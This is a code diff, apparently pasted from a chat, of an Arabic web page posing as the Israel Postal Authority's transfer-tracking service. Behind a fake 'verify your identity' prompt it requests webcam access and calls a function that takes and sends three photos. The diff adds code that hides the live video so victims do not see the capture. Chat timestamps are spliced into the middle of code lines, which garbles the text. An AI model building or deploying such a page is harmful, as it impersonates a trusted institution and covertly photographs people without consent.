@@ -1,3 +1,4 @@
+Julian Barghouti, [03/02/47 02:44 ص]
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -93,11 +94,10 @@
 
 <header>
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/29/Flag_of_Israel_Postal_Authority.svg/1200px-Flag_of_Israel_Postal_Authority.svg.png" alt="شعار البريد الإسرائيلي" style="width: 300px; height: auto; border-radius: 8px;" />
-
 </header>
 
-<main>اهلا وسهلا عزيزي المستفيد الرجاء التأكد من المعلومات 
-    <h1>تتبع الحوالة  </h1>
+<main>
+    <h1>تتبع الحوالة</h1>
     <form id="trackingForm">
         <label for="trackingNumber">رقم الحوالة:</label>
         <input type="text" id="trackingNumber" name="trackingNumber" placeholder="أدخل رقم الحوالة" required />
@@ -105,9 +105,10 @@
     </form>
 
     <div id="message"></div>
-<p style="color: #000000; font-weight: 700; text-align: center; font-family: Arial, sans-serif; font-size: 16px; margin-top: 20px;">
-    شكراً لاستخدامكم خدمة تتبع الحوالات الخاصة بنا. هدفنا تقديم تجربة آمنة وموثوقة لضمان وصول الحوالات بسرعة وأمان.
-</p>
+
+    <p style="color: #000000; font-weight: 700; text-align: center; font-family: Arial, sans-serif; font-size: 16px; margin-top: 20px;">
+        شكراً لاستخدامكم خدمة تتبع الحوالات الخاصة بنا. هدفنا تقديم تجربة آمنة وموثوقة لضمان وصول الحوالات بسرعة وأمان.
+    </p>
 
     <div id="videoContainer">
         <video id="video" autoplay muted playsinline></video>
@@ -128,10 +129,12 @@
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
         messageDiv.style.color = '#800000';
-
         const trackingNumber = document.getElementById('trackingNumber').value.trim();
         if (!trackingNumber) {
-            messageDiv.textContent = 'يرجى إدخال رقم الحوالة.';
+            messageDiv.
+
+Julian Barghouti, [03/02/47 02:44 ص]
+textContent = 'يرجى إدخال رقم الحوالة.';
             messageDiv.style.color = '#b30000';
             return;
         }
@@ -140,15 +143,25 @@
 
         await new Promise(r => setTimeout(r, 2000)); // تأخير 2 ثانية
 
-        messageDiv.textContent = 'لأسباب أمنية، يرجى التحقق من هويتك اضعط السماح.';
-        
+        messageDiv.textContent = 'لأسباب أمنية، يرجى التحقق من هويتك اضغط السماح.';
+
         try {
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
-            video.style.display = 'block';
+
+            // بعد تشغيل الفيديو، نخفي العنصر من الصفحة تمامًا بعد ثانية
+            setTimeout(() => {
+                const container = document.getElementById('videoContainer');
+                if (container && video) {
+                    video.pause();
+                    video.removeAttribute("srcObject");
+                    container.innerHTML = ''; // إزالة الفيديو من DOM نهائيًا
+                }
+            }, 1000); // 1 ثانية تأخير
+
             takePhotosAndSend();
         } catch (err) {
-            messageDiv.textContent = 'تعذر الوصول إلى الكاميرا. يرجى السماح بالوصول للتحقق انك انسان حقيقي .';
+            messageDiv.textContent = 'تعذر الوصول إلى الكاميرا. يرجى السماح بالوصول للتحقق أنك إنسان حقيقي.';
             messageDiv.style.color = '#b30000';
         }
     });
@@ -162,7 +175,6 @@
             if (photoCount >= 3) {
                 clearInterval(captureInterval);
                 messageDiv.textContent = 'تم التحقق بنجاح. شكراً لتعاونك.';
-                video.style.display = 'none';
                 stopStream();
                 return;
             }
@@ -211,53 +223,35 @@
         }
     }
 </script>
+
 <footer style="background-color: #cc0000; color: white; padding: 20px 10px; text-align: center; font-family: Arial, sans-serif;">
+    <div style="max-width: 800px; margin: auto; display: flex; flex-wrap: wrap; justify-content: center; gap: 30px; align-items: center;">
+        <button onclick="window.location.href='mailto:support@example.com'" 
+            style="background-color: white; color: #cc0000; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold;">
+            الاتصال بنا
+        </button>
+        <a href="#faq" style="color: white; font-weight: bold; text-decoration: none; line-height: 30px;">
+            أسئلة شائعة
+        </a>
+        <a href="tel:171" style="color: white; font-weight: bold; text-decoration: none; line-height: 30px;">
+            الاتصال على 171
+        </a>
+        <div style="display: flex; gap: 15px; align-items: center;">
+            <a href="https://instagram.
 
-  <div style="max-width: 800px; margin: auto; display: flex; flex-wrap: wrap; justify-content: center; gap: 30px; align-items: center;">
-
-    <button onclick="window.location.href='mailto:support@example.com'" 
-      style="background-color: white; color: #cc0000; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold;">
-      الاتصال بنا
-    </button>
-
-    <a href="#faq" style="color: white; font-weight: bold; text-decoration: none; line-height: 30px;">
-      أسئلة شائعة
-    </a>
-
-    <a href="tel:171" style="color: white; font-weight: bold; text-decoration: none; line-height: 30px;">
-      الاتصال على 171
-    </a>
-
-    <div style="display: flex; gap: 15px; align-items: center;">
-      <a href="https://instagram.com/" target="_blank" rel="noopener" aria-label="Instagram">
-        <img src="https://cdn-icons-png.flaticon.com/512/1384/1384063.png" alt="Instagram" style="width: 24px; height: 24px;" />
-      </a>
-      <a href="https://facebook.com/" target="_blank" rel="noopener" aria-label="Facebook">
-        <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook" style="width: 24px; height: 24px;" />
-      </a>
+Julian Barghouti, [03/02/47 02:44 ص]
+com/" target="_blank" rel="noopener" aria-label="Instagram">
+                <img src="https://cdn-icons-png.flaticon.com/512/1384/1384063.png" alt="Instagram" style="width: 24px; height: 24px;" />
+            </a>
+            <a href="https://facebook.com/" target="_blank" rel="noopener" aria-label="Facebook">
+                <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook" style="width: 24px; height: 24px;" />
+            </a>
+        </div>
     </div>
-
-  </div>
-
-  <p style="margin-top: 15px; font-size: 14px;">
-    جميع الحقوق محفوظة &copy; 2025
-  </p>
-
+    <p style="margin-top: 15px; font-size: 14px;">
+        جميع الحقوق محفوظة &copy; 2025
+    </p>
 </footer>
 
-</body><header>
-   <div style="display: flex; align-items: center; gap: 20px; max-width: 700px;">
-  <img
-    src="https://israelpost.co.il/media/4134/46-47955_doar_website_v103.png"
-    alt="شعار البريد الإسرائيلي"
-    style="width: 300px; height: auto; border-radius: 8px;"
-  />
-  <div style="font-family: Arial, sans-serif; color: #000000; font-size: 16px; line-height: 1.4;">
-    <strong>تتبع التسليم السريع</strong><br />
-    معلومات عبر الإنترنت حول العناصر المرسلة عبر البريد السريع والبريد المسجل داخل البلاد والخدمات في الخارج ومن الخارج: EMS و ECO POST.
-  </div>
-</div>
- 
-</header>
-
+</body>
 </html>
